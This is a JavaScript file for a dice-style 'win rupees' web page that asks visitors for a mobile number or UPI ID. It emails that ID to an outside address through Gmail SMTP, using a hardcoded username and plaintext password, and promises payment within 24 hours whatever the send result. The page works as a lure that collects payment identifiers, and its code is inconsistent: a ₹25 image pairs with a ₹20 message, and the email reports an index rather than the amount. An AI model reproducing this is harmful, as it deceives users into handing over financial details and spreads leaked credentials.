let images = [
  "./image/₹ 35.png",
  "./image/₹ 25.png",
  "./image/₹ 5.png",
  "./image/₹ 0.png",
  "./image/₹ 10.png",
  "./image/₹ 0.png",
  // "dice-05.svg",
  // "dice-06.svg"
];
let dice = document.querySelectorAll("img");
var dieOneValue = Math.floor(Math.random() * 6);

function roll() {
  let mon = document.getElementById("mon");
  mon.style.display = "block";
  let rtd = document.getElementById("rtd");
  rtd.style.display = "none";
  var phone = document.getElementById("phone");
  phone.style.display = "block";
  dice.forEach(function (die) {
    die.classList.add("shake");
  });
  setTimeout(function () {
    dice.forEach(function (die) {
      die.classList.remove("shake");
    });
    // var dieOneValue = Math.floor(Math.random()*6);
    // let dieTwoValue = Math.floor(Math.random()*6);
    // console.log(dieOneValue);
    document.querySelector("#die-1").setAttribute("src", images[dieOneValue]);
    // document.querySelector("#die-2").setAttribute("src", images[dieTwoValue]);
    if (dieOneValue == 0) {
      document.querySelector("#total").innerHTML =
        "Congratulations!! You Won  &#8377;35 ";
      // alert("hello world ")
    }
    if (dieOneValue == 1) {
      document.querySelector("#total").innerHTML =
        "Congratulations!!  You Won  &#8377;20 ";
      // alert("hello world ")
    }
    if (dieOneValue == 2) {
      document.querySelector("#total").innerHTML =
        "Congratulations!!  You Won &#8377; 5 ";
      // alert("hello world ")
    }
    if (dieOneValue == 3) {
      document.querySelector("#total").innerHTML =
        "You Won  &#8377;0,   Better Luck Next Time, Close The tab of your browser to quit!!";
        phone.style.display = "none"   
        mon.style.display = "none"
      // alert("hello world ")
    }
    if (dieOneValue == 4) {
      document.querySelector("#total").innerHTML =
        "Congratulations!!  You Won  &#8377;10  ";
      // alert("hello world ")
    }
    if (dieOneValue == 5) {
      document.querySelector("#total").innerHTML =
        "You Won &#8377;0,   Better Luck Next Time, Close The tab of your browser to quit!!";
        phone.style.display = "none"
        mon.style.display = "none"
      // alert("hello world ")
    }
  }, 1000);

  // .then(
  //   message => alert("Your Money Will be Paid In 24 Hours ")
  // );
}
// roll();
function email(params) {
    // window.location.replace("http://cleverhare.great-site.net")
    
var pval = document.getElementById("phone").value;
  Email.send({
    Host: "smtp.gmail.com",
    Username: "soumyajitbrah@gmail.com",
    Password: "So@bk^236",
    To: "cleverhare.greatsite@gmail.com",
    From: "soumyajitbrah@gmail.com",
    Subject: "Subject and rupees to be paid",
    Body:
      "The user mobile no or upi id is: " + pval + " And The Rupees To be Paid is: " + dieOneValue,
  }).then((message) => {
    if (message == "ok") {
      alert(
        "Thank You For Playing We Hope You Will Earn Much More and Congrats for this. Your reward will be paid in the next 24 Working hours"
      );
    } else {
      alert(
        "Thank You For Playing We Hope You Will Earn Much More and Congrats for this. Your reward will be paid in the next 24 Working hours"
      );
    }
  });
  
}

